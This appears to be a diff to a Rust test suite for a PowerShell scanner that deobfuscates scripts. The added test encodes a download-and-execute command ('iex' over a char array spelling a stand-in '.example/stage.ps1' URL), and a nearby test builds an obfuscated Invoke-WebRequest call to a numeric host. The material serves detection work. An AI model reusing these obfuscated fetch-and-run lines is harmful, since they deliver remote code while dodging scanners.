@@ -8889,6 +8889,24 @@ iex $stage
     }
 
     #[test]
+    fn ps1_normalization_decodes_unary_join_char_array() {
+        let chars = "https://unary-join-char-array.example/stage.ps1"
+            .chars()
+            .map(|ch| u32::from(ch).to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let ps = format!("iex (-join [char[]]({chars}))");
+
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains("https://unary-join-char-array.example/stage.ps1"),
+            "unary join char-array call was not decoded:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_variable_index_concat_assignment() {
         let ps = "$ROOMS='UJDYFNDHSINSHYEXHJPJAQRNFLSXAWJ';$NEXT=$ROOMS[9]+$ROOMS[14]+$ROOMS[15];&$NEXT (Invoke-WebRequest 1297338337/x.jpg)";
         let normalized = crate::ps1_scan::normalize_ps1_text(ps);
